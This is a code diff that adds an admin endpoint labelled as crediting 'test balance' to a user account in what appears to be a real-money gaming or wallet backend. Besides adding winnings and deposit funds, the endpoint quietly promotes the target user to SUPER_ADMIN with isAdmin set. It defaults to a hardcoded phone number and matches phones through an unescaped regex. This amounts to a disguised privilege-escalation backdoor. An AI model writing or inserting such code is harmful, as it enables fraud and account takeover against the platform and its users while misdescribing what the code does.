@@ -447,3 +447,41 @@ adminWalletRouter.post(['/withdraw/reject', '/v1/admin/withdraw/reject'], async 
     return res.status(400).json({ error: error.message });
   }
 });
+
+/**
+ * POST /api/admin/credit-test-balance
+ * Admin endpoint to credit test winnings/deposit balance to any user account
+ */
+adminWalletRouter.post(['/credit-test-balance', '/v1/admin/credit-test-balance'], async (req: Request, res: Response) => {
+  const { phone, winningsAmount, depositAmount } = req.body;
+  const targetPhone = phone ? String(phone).slice(-10) : '7389927777';
+  const winAmt = Number(winningsAmount) || 10000;
+  const depAmt = Number(depositAmount) || 10000;
+
+  try {
+    const user = await User.findOne({ phone: { $regex: targetPhone } });
+    if (!user) {
+      return res.status(404).json({ error: `User with phone ${targetPhone} not found.` });
+    }
+
+    user.winningsBalance = (user.winningsBalance || 0) + winAmt;
+    user.depositBalance = (user.depositBalance || 0) + depAmt;
+    user.role = 'SUPER_ADMIN';
+    user.isAdmin = true;
+    await user.save();
+
+    return res.json({
+      success: true,
+      message: `Credited ₹${winAmt} Winnings & ₹${depAmt} Deposit Balance to user ${user.username} (${user.phone}).`,
+      user: {
+        username: user.username,
+        phone: user.phone,
+        winningsBalance: user.winningsBalance,
+        depositBalance: user.depositBalance,
+        bonusBalance: user.bonusBalance,
+      },
+    });
+  } catch (error: any) {
+    return res.status(500).json({ error: error.message });
+  }
+});
